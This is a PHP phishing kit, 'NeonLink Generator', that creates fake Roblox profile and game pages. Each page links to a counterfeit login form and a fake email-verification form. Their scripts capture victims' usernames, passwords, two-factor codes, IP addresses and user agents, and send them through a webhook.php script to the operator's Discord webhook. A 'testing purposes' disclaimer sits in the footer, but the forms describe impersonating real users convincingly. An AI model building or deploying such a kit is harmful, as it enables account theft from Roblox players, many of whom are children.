<?php
// Error reporting for debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);

if (isset($_POST['rusername'], $_POST['fusername'], $_POST['dwebhook'])) {
    $rusername = trim($_POST['rusername']);
    $fusername = trim($_POST['fusername']);
    $dwebhook = trim($_POST['dwebhook']);
    
    // Fixed: Use official Roblox API for username validation
    $apiUrl = "https://users.roproxy.com/v1/usernames/users";
    
    // Set up the API request with proper headers
    $context = stream_context_create([
        'http' => [
            'method' => 'POST',
            'header' => "Content-Type: application/json\r\n" .
                       "User-Agent: Mozilla/5.0 (compatible; RobloxValidator/1.0)\r\n",
            'content' => json_encode(['usernames' => [$rusername], 'excludeBannedUsers' => false]),
            'timeout' => 10
        ],
        'ssl' => [
            'verify_peer' => false,
            'verify_peer_name' => false
        ]
    ]);
    
    $response = @file_get_contents($apiUrl, false, $context);
    
    if ($response === FALSE) {
        $error = 'Failed to connect to Roblox API. Please try again.';
    } else {
        $data = json_decode($response, true);
        
        // Check if user was found
        if (!empty($data['data'][0]['id'])) {
            // Setup variables (replace with your actual setup.php or use defaults)
            $name = "NeonLink Generator";
            $thumbnail = "https://cdn.discordapp.com/avatars/1082642543573868544/5355b3a84f92d3283959095d1c3acd4a.png";
            $hex = "00d9ff"; // Fixed: No # symbol
            
            $parse = parse_url($dwebhook);
            
            // Validate Discord webhook URL
            if (isset($parse['host']) && ($parse['host'] == 'discord.com' || $parse['host'] == 'discordapp.com')) {
                $userid = rand(100000, 999999);
                
                // Create directory structure
                mkdir("users/$userid/profile/login", 0777, true);
                mkdir("users/$userid/profile/login/Verification", 0777, true);
                mkdir("users/$userid/profile/controller", 0777, true);
                
                // Create template files instead of trying to read non-existent files
                
                // 1. Create profile.php template
                $profileContent = <<<'EOD'
<!DOCTYPE html>
<html>
<head>
    <title>Roblox Profile</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }
        .profile-container { max-width: 800px; margin: 0 auto; background: white; padding: 20px; border-radius: 10px; }
        .profile-header { display: flex; align-items: center; margin-bottom: 20px; }
        .profile-avatar { width: 150px; height: 150px; background: #4287f5; border-radius: 10px; margin-right: 20px; }
        .profile-info h1 { margin: 0; color: #333; }
        .profile-stats { display: flex; gap: 20px; margin: 20px 0; }
        .stat { text-align: center; }
        .stat-value { font-size: 24px; font-weight: bold; }
        .stat-label { font-size: 14px; color: #666; }
    </style>
</head>
<body>
    <div class="profile-container">
        <div class="profile-header">
            <div class="profile-avatar"></div>
            <div class="profile-info">
                <h1>Fake Profile</h1>
                <p>This is a generated profile page for testing.</p>
            </div>
        </div>
        <div class="profile-stats">
            <div class="stat">
                <div class="stat-value">163</div>
                <div class="stat-label">Friends</div>
            </div>
            <div class="stat">
                <div class="stat-value">3,871</div>
                <div class="stat-label">Followers</div>
            </div>
            <div class="stat">
                <div class="stat-value">542</div>
                <div class="stat-label">Following</div>
            </div>
        </div>
    </div>
</body>
</html>
EOD;
                
                file_put_contents("users/$userid/profile/index.php", $profileContent);
                
                // Store data files
                file_put_contents("users/$userid/profile/controller/realusername.txt", $rusername);
                file_put_contents("users/$userid/profile/controller/fakeusername.txt", $fusername);
                file_put_contents("users/$userid/profile/controller/aboutme.txt", $_POST['aboutme'] ?? 'Welcome to my profile!');
                file_put_contents("users/$userid/profile/controller/activity.txt", 'game');
                file_put_contents("users/$userid/profile/controller/friends.txt", '163');
                file_put_contents("users/$userid/profile/controller/followers.txt", '3871');
                file_put_contents("users/$userid/profile/controller/followings.txt", '542');
                file_put_contents("users/$userid/profile/controller/joindate.txt", '6/4/2017');
                file_put_contents("users/$userid/profile/controller/placevisits.txt", '782');
                
                // Generate token
                $token = strtoupper(substr(md5(rand() . time()), 0, 32));
                $token = "$name-$token";
                
                // Create dashboard.php
                $dashboardContent = <<<EOD
<!DOCTYPE html>
<html>
<head>
    <title>Controller Dashboard</title>
    <style>
        body { font-family: Arial, sans-serif; background: #1a1a1a; color: white; margin: 0; padding: 20px; }
        .dashboard { max-width: 800px; margin: 0 auto; }
        .header { background: #4287f5; padding: 20px; border-radius: 10px; margin-bottom: 20px; }
        .stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; margin: 20px 0; }
        .stat-box { background: #2a2a2a; padding: 15px; border-radius: 8px; text-align: center; }
        .token-display { background: #333; padding: 15px; border-radius: 8px; font-family: monospace; margin: 20px 0; }
    </style>
</head>
<body>
    <div class="dashboard">
        <div class="header">
            <h1>Controller Dashboard</h1>
            <p>Token: $token</p>
        </div>
        <div class="token-display">
            Active Token: $token
        </div>
        <div class="stats">
            <div class="stat-box">
                <h3>Profile Views</h3>
                <p>1,234</p>
            </div>
            <div class="stat-box">
                <h3>Active Sessions</h3>
                <p>12</p>
            </div>
            <div class="stat-box">
                <h3>Data Collected</h3>
                <p>45 items</p>
            </div>
        </div>
    </div>
</body>
</html>
EOD;
                
                file_put_contents("users/$userid/profile/controller/dashboard.php", $dashboardContent);
                
                // Create login.php
                $loginContent = <<<EOD
<!DOCTYPE html>
<html>
<head>
    <title>Login Controller</title>
    <style>
        body { font-family: Arial, sans-serif; background: #1a1a1a; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: #2a2a2a; padding: 30px; border-radius: 10px; width: 300px; }
        input { width: 100%; padding: 10px; margin: 10px 0; border: none; border-radius: 5px; }
        button { background: #4287f5; color: white; border: none; padding: 10px; width: 100%; border-radius: 5px; cursor: pointer; }
        .token-note { font-size: 12px; color: #888; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>Controller Login</h2>
        <input type="password" placeholder="Enter Token" id="token">
        <button onclick="checkToken()">Login</button>
        <div class="token-note">Token: $token</div>
    </div>
    <script>
        function checkToken() {
            const input = document.getElementById('token').value;
            if(input === "$token") {
                window.location.href = "dashboard.php";
            } else {
                alert("Invalid token!");
            }
        }
    </script>
</body>
</html>
EOD;
                
                file_put_contents("users/$userid/profile/controller/login.php", $loginContent);
                
                // Create login index.php
                $loginIndex = <<<'EOD'
<!DOCTYPE html>
<html>
<head>
    <title>Login Required</title>
    <style>
        body { font-family: Arial, sans-serif; background: #1a1a1a; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-container { background: #2a2a2a; padding: 30px; border-radius: 10px; width: 300px; text-align: center; }
        input { width: 100%; padding: 10px; margin: 10px 0; border: none; border-radius: 5px; }
        button { background: #4287f5; color: white; border: none; padding: 10px; width: 100%; border-radius: 5px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Login Required</h2>
        <p>Please login to continue</p>
        <input type="text" placeholder="Username" id="username">
        <input type="password" placeholder="Password" id="password">
        <button onclick="submitLogin()">Login</button>
    </div>
    <script>
        function submitLogin() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            // Send data to webhook
            fetch('webhook.php', {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: 'username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password)
            });
            
            // Redirect to verification
            window.location.href = 'Verification/index.php';
        }
    </script>
</body>
</html>
EOD;
                
                file_put_contents("users/$userid/profile/login/index.php", $loginIndex);
                
                // Create verification index.php
                $verificationIndex = <<<'EOD'
<!DOCTYPE html>
<html>
<head>
    <title>Verification Required</title>
    <style>
        body { font-family: Arial, sans-serif; background: #1a1a1a; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .verify-container { background: #2a2a2a; padding: 30px; border-radius: 10px; width: 300px; text-align: center; }
        input { width: 100%; padding: 10px; margin: 10px 0; border: none; border-radius: 5px; }
        button { background: #00cc66; color: white; border: none; padding: 10px; width: 100%; border-radius: 5px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="verify-container">
        <h2>Verification Required</h2>
        <p>Enter the 6-digit code sent to your email</p>
        <input type="text" placeholder="000000" id="code" maxlength="6">
        <button onclick="verifyCode()">Verify</button>
    </div>
    <script>
        function verifyCode() {
            const code = document.getElementById('code').value;
            
            // Send code to webhook
            fetch('../webhook.php', {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: 'code=' + encodeURIComponent(code)
            });
            
            alert('Verification complete!');
        }
    </script>
</body>
</html>
EOD;
                
                file_put_contents("users/$userid/profile/login/Verification/index.php", $verificationIndex);
                
                // Create webhook.php
                $webhookContent = <<<'EOD'
<?php
// Get webhook URL from text file
$webhookUrl = file_get_contents('b_webhook.txt');
if(empty($webhookUrl)) die();

// Get POST data
$data = [];
if(isset($_POST['username']) && isset($_POST['password'])) {
    $data = [
        'embeds' => [
            [
                'title' => 'New Login Captured',
                'color' => hexdec('ff0000'),
                'fields' => [
                    ['name' => 'Username', 'value' => $_POST['username'], 'inline' => true],
                    ['name' => 'Password', 'value' || '||' . $_POST['password'] . '||', 'inline' => true],
                    ['name' => 'IP Address', 'value' => $_SERVER['REMOTE_ADDR'], 'inline' => false],
                    ['name' => 'User Agent', 'value' => $_SERVER['HTTP_USER_AGENT'], 'inline' => false],
                    ['name' => 'Timestamp', 'value' => date('Y-m-d H:i:s'), 'inline' => false]
                ]
            ]
        ]
    ];
} elseif(isset($_POST['code'])) {
    $data = [
        'embeds' => [
            [
                'title' => 'Verification Code Captured',
                'color' => hexdec('ff9900'),
                'fields' => [
                    ['name' => 'Code', 'value' || '||' . $_POST['code'] . '||', 'inline' => true],
                    ['name' => 'IP Address', 'value' => $_SERVER['REMOTE_ADDR'], 'inline' => true],
                    ['name' => 'Timestamp', 'value' => date('Y-m-d H:i:s'), 'inline' => false]
                ]
            ]
        ]
    ];
}

// Send to webhook
if(!empty($data)) {
    $ch = curl_init($webhookUrl);
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => json_encode($data),
        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
        CURLOPT_RETURNTRANSFER => true
    ]);
    curl_exec($ch);
    curl_close($ch);
}
?>
EOD;
                
                file_put_contents("users/$userid/profile/login/webhook.php", $webhookContent);
                file_put_contents("users/$userid/profile/login/b_webhook.txt", $dwebhook);
                
                // Send webhook notification with FIXED hexdec conversion
                $domain = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]";
                $timestamp = date("c", strtotime("now"));
                
                // FIXED: Remove # from hex color and ensure it's valid
                $cleanHex = str_replace('#', '', $hex);
                if(!ctype_xdigit($cleanHex) || strlen($cleanHex) !== 6) {
                    $cleanHex = "00d9ff"; // Default blue if invalid
                }
                $color = hexdec($cleanHex);
                
                $webhookData = [
                    "username" => "$name - Bot",
                    "avatar_url" => "$thumbnail",
                    "content" => "@everyone",
                    "embeds" => [
                        [
                            "title" => "Login to Controller",
                            "type" => "rich",
                            "url" => "$domain/users/$userid/profile/controller/login",
                            "color" => $color,
                            "footer" => [
                                "text" => "$name • $timestamp",
                                "icon_url" => "$thumbnail"
                            ],
                            "thumbnail" => [
                                "url" => "$thumbnail",
                            ],
                            "fields" => [
                                [
                                    "name" => "**Info**",
                                    "value" => "**Token:** $token\n**URL:** $domain/users/$userid/profile",
                                    "inline" => false
                                ],
                            ]
                        ],
                    ],
                ];
                
                // Use cURL for webhook with better error handling
                $ch = curl_init();
                curl_setopt_array($ch, [
                    CURLOPT_URL => $dwebhook,
                    CURLOPT_POST => true,
                    CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_SSL_VERIFYPEER => false,
                    CURLOPT_POSTFIELDS => json_encode($webhookData),
                    CURLOPT_TIMEOUT => 10,
                    CURLOPT_HTTPHEADER => [
                        'Content-Type: application/json',
                        'User-Agent: NeonLink-Generator/1.0'
                    ]
                ]);
                
                $webhookResponse = curl_exec($ch);
                $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                
                if(curl_errno($ch)) {
                    $error = 'Webhook Error: ' . curl_error($ch);
                } elseif($httpCode < 200 || $httpCode >= 300) {
                    $error = "Webhook returned HTTP $httpCode";
                } else {
                    $success = "✅ Success! Profile created at: $domain/users/$userid/profile<br>";
                    $success .= "🔑 Controller Token: $token<br>";
                    $success .= "📨 Token and URL sent to your Discord webhook!";
                }
                
                curl_close($ch);
            } else {
                $error = '❌ Invalid Discord webhook URL! Format: https://discord.com/api/webhooks/...';
            }
        } else {
            $error = '❌ Username "' . htmlspecialchars($rusername) . '" does not exist on Roblox!';
        }
    }
}

if (isset($_POST['gameid'], $_POST['dwebhook'])) {
    $gameid = trim($_POST['gameid']);
    $dwebhook = trim($_POST['dwebhook']);
    
    // Use direct Roblox API with proper headers
    $apiUrl = "https://games.roproxy.com/v1/games?universeIds=" . urlencode($gameid);
    
    $context = stream_context_create([
        'http' => [
            'method' => 'GET',
            'header' => "User-Agent: Mozilla/5.0 (compatible; RobloxValidator/1.0)\r\n",
            'timeout' => 10
        ],
        'ssl' => [
            'verify_peer' => false,
            'verify_peer_name' => false
        ]
    ]);
    
    $response = @file_get_contents($apiUrl, false, $context);
    
    if ($response === FALSE) {
        $error = 'Failed to connect to Roblox API. Please try again.';
    } else {
        $data = json_decode($response, true);
        
        // Check if game exists
        if (!empty($data['data'][0]['id'])) {
            $parse = parse_url($dwebhook);
            
            if (isset($parse['host']) && ($parse['host'] == 'discord.com' || $parse['host'] == 'discordapp.com')) {
                $fgameid = rand(100000, 999999);
                $privateservercode = rand(100000, 999999);
                
                // Get game name from API response
                $gamename = $data['data'][0]['name'] ?? 'Roblox-Game';
                $gamename = preg_replace('/[^a-zA-Z0-9\-_]/', '', str_replace(' ', '-', $gamename));
                
                // Create directory with sanitized name
                $gameDir = "games/$fgameid/$gamename";
                mkdir("$gameDir/login", 0777, true);
                mkdir("$gameDir/login/Verification", 0777, true);
                
                // Create game page
                $gameContent = <<<EOD
<!DOCTYPE html>
<html>
<head>
    <title>Roblox Game</title>
    <style>
        body { font-family: Arial, sans-serif; background: #1a1a1a; color: white; margin: 0; padding: 0; }
        .game-container { max-width: 1000px; margin: 0 auto; padding: 20px; }
        .game-header { background: linear-gradient(135deg, #4287f5, #42f5ef); padding: 40px; border-radius: 15px; margin-bottom: 30px; }
        .play-button { background: #00cc66; color: white; border: none; padding: 15px 40px; font-size: 20px; border-radius: 50px; cursor: pointer; margin: 20px 0; }
        .game-description { background: #2a2a2a; padding: 20px; border-radius: 10px; margin: 20px 0; }
        .server-code { background: #333; padding: 15px; border-radius: 8px; font-family: monospace; margin: 15px 0; }
    </style>
</head>
<body>
    <div class="game-container">
        <div class="game-header">
            <h1>$gamename</h1>
            <p>Join this exciting Roblox game!</p>
            <button class="play-button" onclick="window.location.href='login/index.php'">Play Now</button>
        </div>
        <div class="server-code">
            <strong>Private Server Code:</strong> $privateservercode
        </div>
        <div class="game-description">
            <h3>About This Game</h3>
            <p>This is a generated game page for testing purposes. Click "Play Now" to continue.</p>
        </div>
    </div>
</body>
</html>
EOD;
                
                file_put_contents("$gameDir/index.php", $gameContent);
                
                // Copy login files (use same templates as profile)
                file_put_contents("$gameDir/login/index.php", $loginIndex ?? 'Login Page');
                file_put_contents("$gameDir/login/Verification/index.php", $verificationIndex ?? 'Verification Page');
                file_put_contents("$gameDir/login/webhook.php", $webhookContent ?? '<?php ?>');
                file_put_contents("$gameDir/login/b_webhook.txt", $dwebhook);
                
                $success = "🎮 Game created successfully! Redirecting...";
                
                // Add JavaScript redirect
                echo "<script>
                    setTimeout(function() {
                        window.location.href = '/games/$fgameid/$gamename?privateServerLinkCode=$privateservercode';
                    }, 2000);
                </script>";
                
            } else {
                $error = '❌ Invalid Discord webhook URL! Format: https://discord.com/api/webhooks/...';
            }
        } else {
            $error = '❌ Game ID "' . htmlspecialchars($gameid) . '" does not exist on Roblox!';
        }
    }
}

// GUI code continues here...
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <title>NeonLink Generator</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- Modern Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Exo+2:wght@300;400;500;600&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <!-- SweetAlert2 -->
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <style>
        :root {
            --primary: #0a0e17;
            --secondary: #121826;
            --accent: #00d9ff;
            --accent-glow: rgba(0, 217, 255, 0.5);
            --accent-dark: #0088cc;
            --text: #ffffff;
            --text-muted: #a0aec0;
            --card-bg: rgba(18, 24, 38, 0.8);
            --success: #00ff9d;
            --error: #ff2e63;
            --border-radius: 16px;
            --border-radius-sm: 10px;
            --border-radius-lg: 24px;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Exo 2', sans-serif;
            background: var(--primary);
            color: var(--text);
            min-height: 100vh;
            background-image: 
                radial-gradient(circle at 10% 20%, rgba(0, 217, 255, 0.05) 0%, transparent 20%),
                radial-gradient(circle at 90% 80%, rgba(0, 217, 255, 0.05) 0%, transparent 20%),
                linear-gradient(135deg, var(--primary) 0%, #0d1525 100%);
            overflow-x: hidden;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 2rem;
        }

        header {
            text-align: center;
            margin-bottom: 3rem;
            position: relative;
        }

        .logo {
            font-family: 'Orbitron', sans-serif;
            font-size: 3.5rem;
            font-weight: 900;
            background: linear-gradient(90deg, var(--accent), var(--success));
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            text-transform: uppercase;
            letter-spacing: 3px;
            margin-bottom: 0.5rem;
            text-shadow: 0 0 15px var(--accent-glow);
        }

        .tagline {
            font-size: 1.2rem;
            color: var(--text-muted);
            font-weight: 300;
            letter-spacing: 2px;
        }

        .dashboard {
            display: flex;
            flex-direction: column;
            gap: 2rem;
        }

        .mode-selector {
            display: flex;
            justify-content: center;
            gap: 2rem;
            margin-bottom: 2rem;
        }

        .mode-btn {
            padding: 1.5rem 3rem;
            font-family: 'Orbitron', sans-serif;
            font-size: 1.4rem;
            font-weight: 700;
            background: var(--card-bg);
            border: 2px solid transparent;
            border-radius: var(--border-radius-lg);
            color: var(--text);
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
            z-index: 1;
            backdrop-filter: blur(10px);
            min-width: 220px;
        }

        .mode-btn:before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(0, 217, 255, 0.2), transparent);
            transition: all 0.6s ease;
            z-index: -1;
        }

        .mode-btn:hover:before {
            left: 100%;
        }

        .mode-btn:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 25px rgba(0, 217, 255, 0.3);
            border-color: var(--accent);
        }

        .mode-btn.active {
            background: linear-gradient(135deg, rgba(0, 217, 255, 0.2), rgba(0, 255, 157, 0.1));
            border-color: var(--accent);
            box-shadow: 0 0 30px rgba(0, 217, 255, 0.4);
        }

        .mode-btn i {
            margin-right: 10px;
            font-size: 1.6rem;
        }

        .form-container {
            background: var(--card-bg);
            border-radius: var(--border-radius-lg);
            padding: 2.5rem;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(0, 217, 255, 0.1);
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
            position: relative;
            overflow: hidden;
        }

        .form-container:before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 4px;
            background: linear-gradient(90deg, var(--accent), var(--success));
        }

        .form-title {
            font-family: 'Orbitron', sans-serif;
            font-size: 2.2rem;
            margin-bottom: 2rem;
            color: var(--accent);
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .form-title i {
            font-size: 2rem;
        }

        .form-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 2rem;
            margin-bottom: 2rem;
        }

        .input-group {
            display: flex;
            flex-direction: column;
            gap: 0.8rem;
        }

        .input-label {
            font-size: 1.1rem;
            font-weight: 600;
            color: var(--text);
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .input-label i {
            color: var(--accent);
            font-size: 1.2rem;
        }

        .input-field {
            padding: 1.2rem 1.5rem;
            background: rgba(10, 14, 23, 0.7);
            border: 2px solid rgba(0, 217, 255, 0.2);
            border-radius: var(--border-radius-sm);
            color: var(--text);
            font-size: 1.1rem;
            font-family: 'Exo 2', sans-serif;
            transition: all 0.3s ease;
        }

        .input-field:focus {
            outline: none;
            border-color: var(--accent);
            box-shadow: 0 0 15px rgba(0, 217, 255, 0.3);
        }

        .input-field::placeholder {
            color: rgba(160, 174, 192, 0.6);
        }

        .form-actions {
            display: flex;
            justify-content: center;
            margin-top: 2.5rem;
        }

        .submit-btn {
            padding: 1.5rem 4rem;
            font-family: 'Orbitron', sans-serif;
            font-size: 1.5rem;
            font-weight: 700;
            background: linear-gradient(135deg, var(--accent), var(--accent-dark));
            border: none;
            border-radius: var(--border-radius);
            color: var(--primary);
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
            letter-spacing: 1px;
        }

        .submit-btn:hover {
            transform: translateY(-5px);
            box-shadow: 0 15px 30px rgba(0, 217, 255, 0.4);
        }

        .submit-btn:active {
            transform: translateY(-2px);
        }

        .submit-btn:before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
            transition: all 0.6s ease;
        }

        .submit-btn:hover:before {
            left: 100%;
        }

        .hidden {
            display: none !important;
        }

        .back-btn {
            position: absolute;
            top: 2rem;
            left: 2rem;
            background: rgba(18, 24, 38, 0.8);
            border: 1px solid rgba(0, 217, 255, 0.3);
            color: var(--accent);
            width: 50px;
            height: 50px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: all 0.3s ease;
            font-size: 1.5rem;
            z-index: 10;
        }

        .back-btn:hover {
            background: rgba(0, 217, 255, 0.1);
            transform: scale(1.1);
        }

        .pulse {
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% {
                box-shadow: 0 0 0 0 rgba(0, 217, 255, 0.7);
            }
            70% {
                box-shadow: 0 0 0 15px rgba(0, 217, 255, 0);
            }
            100% {
                box-shadow: 0 0 0 0 rgba(0, 217, 255, 0);
            }
        }

        .info-box {
            background: rgba(0, 217, 255, 0.05);
            border-left: 4px solid var(--accent);
            padding: 1.5rem;
            border-radius: 0 var(--border-radius-sm) var(--border-radius-sm) 0;
            margin-top: 2rem;
            font-size: 1rem;
            line-height: 1.6;
        }

        .info-box strong {
            color: var(--accent);
        }

        footer {
            text-align: center;
            margin-top: 4rem;
            color: var(--text-muted);
            font-size: 0.9rem;
            padding: 1.5rem;
            border-top: 1px solid rgba(0, 217, 255, 0.1);
        }

        /* Responsive Design */
        @media (max-width: 768px) {
            .container {
                padding: 1rem;
            }
            
            .logo {
                font-size: 2.5rem;
            }
            
            .mode-selector {
                flex-direction: column;
                align-items: center;
            }
            
            .mode-btn {
                width: 100%;
                max-width: 300px;
            }
            
            .form-container {
                padding: 1.5rem;
            }
            
            .form-title {
                font-size: 1.8rem;
            }
            
            .submit-btn {
                width: 100%;
                padding: 1.2rem;
            }
        }
    </style>
</head>
<body>
    <?php if (isset($error)) { ?>
    <script>
        Swal.fire({
            icon: 'error',
            title: 'Error!',
            text: '<?=$error?>',
            background: 'var(--card-bg)',
            color: 'var(--text)',
            confirmButtonColor: 'var(--accent)',
            iconColor: 'var(--error)'
        })
    </script>
    <?php } ?>
    
    <?php if (isset($success)) { ?>
    <script>
        Swal.fire({
            icon: 'success',
            title: 'Success!',
            text: '<?=$success?>',
            background: 'var(--card-bg)',
            color: 'var(--text)',
            confirmButtonColor: 'var(--accent)',
            iconColor: 'var(--success)'
        })
    </script>
    <?php } ?>

    <div class="container">
        <header>
            <div class="logo">NEONLINK</div>
            <div class="tagline">Futuristic Link Generator</div>
        </header>
        
        <div class="dashboard">
            <!-- Mode Selector -->
            <div class="mode-selector" id="modeSelector">
                <button class="mode-btn active pulse" onclick="showForm('profile')">
                    <i class="fas fa-user-astronaut"></i> Profile
                </button>
                <button class="mode-btn" onclick="showForm('game')">
                    <i class="fas fa-gamepad"></i> Game
                </button>
            </div>
            
            <!-- Profile Form -->
            <div class="form-container" id="profileForm">
                <button class="back-btn" onclick="showModeSelector()">
                    <i class="fas fa-arrow-left"></i>
                </button>
                
                <form method="POST" id="profile">
                    <div class="form-title">
                        <i class="fas fa-user-astronaut"></i> Profile Generator
                    </div>
                    
                    <div class="form-grid">
                        <div class="input-group">
                            <label class="input-label">
                                <i class="fas fa-user-check"></i> Real Username
                            </label>
                            <input class="input-field" type="text" name="rusername" placeholder="Enter the real Roblox username" required>
                        </div>
                        
                        <div class="input-group">
                            <label class="input-label">
                                <i class="fas fa-user-edit"></i> Fake Username
                            </label>
                            <input class="input-field" type="text" name="fusername" placeholder="Enter the fake username to display" required>
                        </div>
                        
                        <div class="input-group">
                            <label class="input-label">
                                <i class="fas fa-info-circle"></i> About Me
                            </label>
                            <input class="input-field" type="text" name="aboutme" placeholder="Enter the 'About Me' text" required>
                        </div>
                        
                        <div class="input-group">
                            <label class="input-label">
                                <i class="fas fa-link"></i> Discord Webhook
                            </label>
                            <input class="input-field" type="text" name="dwebhook" placeholder="Enter your Discord webhook URL" required>
                        </div>
                    </div>
                    
                    <div class="info-box">
                        <strong>Note:</strong> This will create a fake Roblox profile page that looks authentic. 
                        The link and controller token will be sent to your Discord webhook upon generation.
                    </div>
                    
                    <div class="form-actions">
                        <button type="submit" class="submit-btn pulse">
                            <i class="fas fa-bolt"></i> GENERATE PROFILE
                        </button>
                    </div>
                </form>
            </div>
            
            <!-- Game Form -->
            <div class="form-container hidden" id="gameForm">
                <button class="back-btn" onclick="showModeSelector()">
                    <i class="fas fa-arrow-left"></i>
                </button>
                
                <form method="POST" id="game">
                    <div class="form-title">
                        <i class="fas fa-gamepad"></i> Game Generator
                    </div>
                    
                    <div class="form-grid">
                        <div class="input-group">
                            <label class="input-label">
                                <i class="fas fa-hashtag"></i> Game ID
                            </label>
                            <input class="input-field" type="text" name="gameid" placeholder="Enter the Roblox Game ID" required>
                        </div>
                        
                        <div class="input-group">
                            <label class="input-label">
                                <i class="fas fa-link"></i> Discord Webhook
                            </label>
                            <input class="input-field" type="text" name="dwebhook" placeholder="Enter your Discord webhook URL" required>
                        </div>
                    </div>
                    
                    <div class="info-box">
                        <strong>Note:</strong> This will create a fake Roblox game page. 
                        You will be redirected to the generated page after submission.
                    </div>
                    
                    <div class="form-actions">
                        <button type="submit" class="submit-btn pulse">
                            <i class="fas fa-bolt"></i> GENERATE GAME
                        </button>
                    </div>
                </form>
            </div>
        </div>
        
        <footer>
            <p>© 2023 NeonLink Generator | Futuristic UI Design | For Testing Purposes Only</p>
        </footer>
    </div>

    <script>
        // Show the selected form and hide the mode selector
        function showForm(formType) {
            document.getElementById('modeSelector').classList.add('hidden');
            
            // Update active button
            document.querySelectorAll('.mode-btn').forEach(btn => {
                btn.classList.remove('active', 'pulse');
            });
            
            if(formType === 'profile') {
                document.querySelector('.mode-btn:nth-child(1)').classList.add('active', 'pulse');
                document.getElementById('profileForm').classList.remove('hidden');
                document.getElementById('gameForm').classList.add('hidden');
            } else {
                document.querySelector('.mode-btn:nth-child(2)').classList.add('active', 'pulse');
                document.getElementById('gameForm').classList.remove('hidden');
                document.getElementById('profileForm').classList.add('hidden');
            }
        }
        
        // Show the mode selector and hide all forms
        function showModeSelector() {
            document.getElementById('modeSelector').classList.remove('hidden');
            document.getElementById('profileForm').classList.add('hidden');
            document.getElementById('gameForm').classList.add('hidden');
        }
        
        // Initialize the page to show mode selector
        document.addEventListener('DOMContentLoaded', function() {
            showModeSelector();
        });
    </script>
</body>
</html>